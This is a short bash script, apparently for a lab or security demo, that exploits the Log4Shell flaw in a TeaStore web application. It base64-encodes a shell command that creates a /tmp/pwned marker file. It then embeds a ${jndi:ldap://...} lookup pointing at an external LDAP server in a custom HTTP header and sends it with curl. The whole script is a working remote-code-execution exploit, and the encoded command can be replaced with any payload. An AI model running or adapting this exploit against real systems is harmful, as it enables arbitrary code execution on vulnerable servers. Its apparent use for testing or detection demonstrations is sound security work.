#!/usr/bin/env bash

# Define a timestamp function
timestamp() {
  date +"%s" # current time
}

run_curl() {
    filename="/tmp/pwned"$(timestamp)
    command_raw="touch ${filename}"
    command_base64=$(echo $command_raw | base64)
    header='X-AppD-CloudLabAuth: ${jndi:ldap://'$LDAP_SERVER':1389/Basic/Command/Base64/'$command_base64'}'

    echo $filename
    echo $command_raw
    echo $command_base64
    echo $header

    curl -s -H "${header}" "http://teastore-webui:8080/tools.descartes.teastore.webui/"
}

run_curl